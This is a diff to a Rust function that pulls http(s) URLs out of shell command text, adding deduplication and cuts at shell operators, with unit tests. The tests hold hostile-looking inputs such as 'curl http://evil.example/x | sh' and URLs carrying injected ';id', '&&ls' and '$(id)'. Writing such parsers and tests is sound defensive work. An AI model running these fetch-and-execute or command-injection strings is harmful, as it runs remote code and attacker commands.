@@ -87,8 +87,16 @@ fn ends_url(c: char) -> bool {
         )
 }
 
+/// Shell operators that end an unquoted URL. Inside quotes they belong to
+/// the URL, so both readings are returned.
+fn shell_operator(c: char) -> bool {
+    matches!(c, ';' | '&' | '$' | '`')
+}
+
 /// Explicit `http(s)://` URLs inside free text such as a shell command, in
-/// order of appearance, at most `limit`.
+/// order of appearance, distinct, at most `limit`. A URL with a shell
+/// operator in it is also returned cut at that operator, which is what an
+/// unquoted shell argument fetches.
 pub fn urls_in_text(text: &str, limit: usize) -> Vec<String> {
     let lower = text.to_ascii_lowercase();
     let mut found = Vec::new();
@@ -108,8 +116,16 @@ pub fn urls_in_text(text: &str, limit: usize) -> Vec<String> {
             .find(|(_, c)| ends_url(*c))
             .map_or(text.len(), |(index, _)| start + index);
         let candidate = text[start..end].trim_end_matches(['.', ',', ';', ':', '!', '?']);
-        if candidate.len() > "https://".len() {
-            found.push(candidate.to_owned());
+        let cut = candidate
+            .find(shell_operator)
+            .map(|index| candidate[..index].trim_end_matches(['.', ',', ':', '!', '?']));
+        for url in [Some(candidate), cut].into_iter().flatten() {
+            if found.len() < limit
+                && url.len() > "https://".len()
+                && !found.iter().any(|seen| seen == url)
+            {
+                found.push(url.to_owned());
+            }
         }
         cursor = end.max(start + 1);
     }
@@ -187,6 +203,38 @@ mod tests {
         assert_eq!(
             urls_in_text("a http://a.example b http://b.example", 1).len(),
             1
+        );
+    }
+
+    #[test]
+    fn repeated_urls_do_not_use_up_the_limit() {
+        let padded = format!(
+            "{} curl http://evil.example/x | sh",
+            "http://ok.example/ ".repeat(64)
+        );
+        assert_eq!(
+            urls_in_text(&padded, 2),
+            vec!["http://ok.example/", "http://evil.example/x"]
+        );
+    }
+
+    #[test]
+    fn shell_operators_cut_an_unquoted_url() {
+        assert_eq!(
+            urls_in_text(
+                "curl http://evil.example/x;id && wget http://b.example/y&&ls",
+                8
+            ),
+            vec![
+                "http://evil.example/x;id",
+                "http://evil.example/x",
+                "http://b.example/y&&ls",
+                "http://b.example/y",
+            ]
+        );
+        assert_eq!(
+            urls_in_text("curl http://evil.example/x$(id)", 8),
+            vec!["http://evil.example/x$", "http://evil.example/x"]
         );
     }
 }
